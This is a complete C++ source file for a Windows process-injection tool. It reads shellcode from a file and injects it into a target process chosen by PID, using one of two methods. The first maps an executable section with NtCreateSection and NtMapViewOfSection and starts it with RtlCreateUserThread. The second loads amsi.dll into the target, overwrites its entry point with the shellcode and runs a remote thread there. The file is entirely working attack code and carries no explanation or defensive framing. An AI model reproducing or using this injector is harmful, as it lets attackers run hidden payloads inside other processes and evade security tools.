#include <windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <psapi.h>
#pragma comment(lib, "ntdll")
#pragma comment(lib, "psapi")

typedef struct _LSA_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;

using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);

// Read binary file to vector
bool read_file_to_vector(const char* path, std::vector<unsigned char>& out) {
    std::ifstream ifs(path, std::ios::binary | std::ios::ate);
    if (!ifs) return false;
    std::streamsize size = ifs.tellg();
    if (size <= 0) return false;
    ifs.seekg(0, std::ios::beg);
    out.resize((size_t)size);
    if (!ifs.read(reinterpret_cast<char*>(out.data()), size)) return false;
    ifs.close();
    return true;
}

// Technique 1: NtCreateSection + MapView (local + remote) + RtlCreateUserThread
int technique_section_inject(DWORD pid, const std::vector<unsigned char>& shellcode) {
    myNtCreateSection fNtCreateSection = (myNtCreateSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection");
    myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection");
    myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread");

    if (!fNtCreateSection || !fNtMapViewOfSection || !fRtlCreateUserThread) {
        std::cerr << "Failed to resolve required ntdll functions\n";
        return 1;
    }

    SIZE_T viewSize = shellcode.size();
    LARGE_INTEGER sectionSize; sectionSize.QuadPart = (LONGLONG)viewSize;
    HANDLE sectionHandle = NULL;
    PVOID localSectionAddress = NULL;
    PVOID remoteSectionAddress = NULL;

    NTSTATUS st = fNtCreateSection(&sectionHandle,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);
    if (st != 0 || sectionHandle == NULL) {
        std::cerr << "NtCreateSection failed: 0x" << std::hex << st << "\n";
        return 1;
    }

    // map in local process (read/write)
    st = fNtMapViewOfSection(sectionHandle,
        GetCurrentProcess(),
        &localSectionAddress,
        0,
        0,
        NULL,
        &viewSize,
        2, // ViewShare
        0,
        PAGE_READWRITE);
    if (st != 0 || localSectionAddress == NULL) {
        std::cerr << "NtMapViewOfSection (local) failed: 0x" << std::hex << st << "\n";
        CloseHandle(sectionHandle);
        return 1;
    }

    HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!targetHandle) {
        std::cerr << "OpenProcess failed for PID " << pid << " (err " << GetLastError() << ")\n";
        // unmap local view
        UnmapViewOfFile(localSectionAddress); // best-effort
        CloseHandle(sectionHandle);
        return 1;
    }

    // map in remote process (execute)
    st = fNtMapViewOfSection(sectionHandle,
        targetHandle,
        &remoteSectionAddress,
        0,
        0,
        NULL,
        &viewSize,
        2,
        0,
        PAGE_EXECUTE_READ);
    if (st != 0 || remoteSectionAddress == NULL) {
        std::cerr << "NtMapViewOfSection (remote) failed: 0x" << std::hex << st << "\n";
        CloseHandle(targetHandle);
        UnmapViewOfFile(localSectionAddress);
        CloseHandle(sectionHandle);
        return 1;
    }

    // copy shellcode into local view (reflected to remote)
    memcpy(localSectionAddress, shellcode.data(), (size_t)viewSize);

    // create remote thread at remoteSectionAddress
    HANDLE remoteThread = NULL;
    st = fRtlCreateUserThread(targetHandle,
        NULL,
        FALSE,
        0,
        0,
        0,
        remoteSectionAddress,
        NULL,
        &remoteThread,
        NULL);
    if (st != 0) {
        std::cerr << "RtlCreateUserThread failed: 0x" << std::hex << st << "\n";
    }
    else {
        std::cout << "Remote thread created (handle): " << remoteThread << "\n";
        WaitForSingleObject(remoteThread, 2000);
        CloseHandle(remoteThread);
    }

    // cleanup
    // unmap local and remote views where possible
    // Note: NtMapViewOfSection mapping removal not done here via NtUnmapViewOfSection - use UnmapViewOfFile for local mapped view
    UnmapViewOfFile(localSectionAddress);
    // remote unmap ideally with NtUnmapViewOfSection; skipping for simplicity
    CloseHandle(targetHandle);
    CloseHandle(sectionHandle);
    return 0;
}

// Technique 2: Inject benign DLL (LoadLibraryW in remote), locate module base in remote, compute AddressOfEntryPoint, write shellcode there and CreateRemoteThread
int technique_dll_entry_inject(DWORD pid, const std::vector<unsigned char>& shellcode) {
    // path to benign dll to load in remote process - can be full path or just "amsi.dll"
    // using full path increases chance LoadLibraryW finds correct copy
    const wchar_t remoteDllPath[] = L"C:\\Windows\\System32\\amsi.dll";

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!processHandle) {
        std::cerr << "OpenProcess failed for PID " << pid << " (err " << GetLastError() << ")\n";
        return 1;
    }

    // allocate space in remote for DLL path
    SIZE_T remotePathSize = (wcslen(remoteDllPath) + 1) * sizeof(wchar_t);
    LPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, remotePathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << "\n";
        CloseHandle(processHandle);
        return 1;
    }

    if (!WriteProcessMemory(processHandle, remoteBuffer, (LPCVOID)remoteDllPath, remotePathSize, NULL)) {
        std::cerr << "WriteProcessMemory(remote path) failed: " << GetLastError() << "\n";
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // get LoadLibraryW address locally
    HMODULE hKernel32 = GetModuleHandleW(L"Kernel32");
    if (!hKernel32) hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPTHREAD_START_ROUTINE loadLibW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    if (!loadLibW) {
        std::cerr << "GetProcAddress(LoadLibraryW) failed\n";
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // create remote thread to LoadLibraryW(remoteDllPath)
    HANDLE hThread = CreateRemoteThread(processHandle, NULL, 0, loadLibW, remoteBuffer, 0, NULL);
    if (!hThread) {
        std::cerr << "CreateRemoteThread(LoadLibraryW) failed: " << GetLastError() << "\n";
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // wait a bit for the DLL to load (short wait)
    WaitForSingleObject(hThread, 2000);

    // enumerate modules in remote process to find amsi.dll base
    HMODULE modules[1024];
    DWORD cbNeeded = 0;
    if (!EnumProcessModules(processHandle, modules, sizeof(modules), &cbNeeded)) {
        std::cerr << "EnumProcessModules failed: " << GetLastError() << "\n";
        CloseHandle(hThread);
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    size_t modulesCount = cbNeeded / sizeof(HMODULE);
    HMODULE remoteModule = NULL;
    CHAR nameBuf[512];
    for (size_t i = 0; i < modulesCount; ++i) {
        if (GetModuleBaseNameA(processHandle, modules[i], nameBuf, sizeof(nameBuf))) {
            std::string sname(nameBuf);
            // compare lowercase to be safer
            for (auto& c : sname) c = (char)tolower(c);
            if (sname.find("amsi.dll") != std::string::npos) {
                remoteModule = modules[i];
                break;
            }
        }
    }

    if (!remoteModule) {
        std::cerr << "Failed to find injected module in remote process\n";
        CloseHandle(hThread);
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    std::cout << "Found remote module (amsi.dll) at: " << remoteModule << "\n";

    // read remote module headers to compute AddressOfEntryPoint
    SIZE_T headerBufSize = 0x1000;
    std::vector<char> headerBuf(headerBufSize);
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(processHandle, remoteModule, headerBuf.data(), headerBufSize, (SIZE_T*)&bytesRead)) {
        std::cerr << "ReadProcessMemory headers failed: " << GetLastError() << "\n";
        CloseHandle(hThread);
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headerBuf.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "Invalid DOS signature in remote module\n";
        CloseHandle(hThread);
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(headerBuf.data() + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "Invalid NT signature in remote module\n";
        CloseHandle(hThread);
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // compute entry point RVA -> absolute address
    DWORD entryRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
    LPVOID remoteEntryPoint = (LPVOID)((BYTE*)remoteModule + entryRVA);
    std::cout << "Remote module EntryPoint: " << remoteEntryPoint << "\n";

    // write shellcode to entry point
    SIZE_T shellSize = shellcode.size();
    if (!WriteProcessMemory(processHandle, remoteEntryPoint, shellcode.data(), shellSize, NULL)) {
        std::cerr << "WriteProcessMemory to entry point failed: " << GetLastError() << "\n";
        CloseHandle(hThread);
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // create remote thread at entry point
    HANDLE entryThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteEntryPoint, NULL, 0, NULL);
    if (!entryThread) {
        std::cerr << "CreateRemoteThread(entryPoint) failed: " << GetLastError() << "\n";
    }
    else {
        std::cout << "Remote thread created at entryPoint\n";
        WaitForSingleObject(entryThread, 2000);
        CloseHandle(entryThread);
    }

    // cleanup
    CloseHandle(hThread);
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <section|dllentry> <PID> <data.bin>\n";
        return 1;
    }

    std::string technique = argv[1];
    DWORD pid = static_cast<DWORD>(atoi(argv[2]));
    const char* filename = argv[3];

    if (!(technique == "section" || technique == "dllentry")) {
        std::cerr << "Technique must be 'section' or 'dllentry'\n";
        return 1;
    }

    std::vector<unsigned char> shellcode;
    if (!read_file_to_vector(filename, shellcode)) {
        std::cerr << "Failed to read shellcode file: " << filename << "\n";
        return 1;
    }

    if (shellcode.empty()) {
        std::cerr << "Shellcode file is empty\n";
        return 1;
    }

    int rc = 1;
    if (technique == "section") {
        std::cout << "Running section injection into PID " << pid << " with file " << filename << "\n";
        rc = technique_section_inject(pid, shellcode);
    }
    else {
        std::cout << "Running DLL-entry injection into PID " << pid << " with file " << filename << "\n";
        rc = technique_dll_entry_inject(pid, shellcode);
    }

    return rc;
}
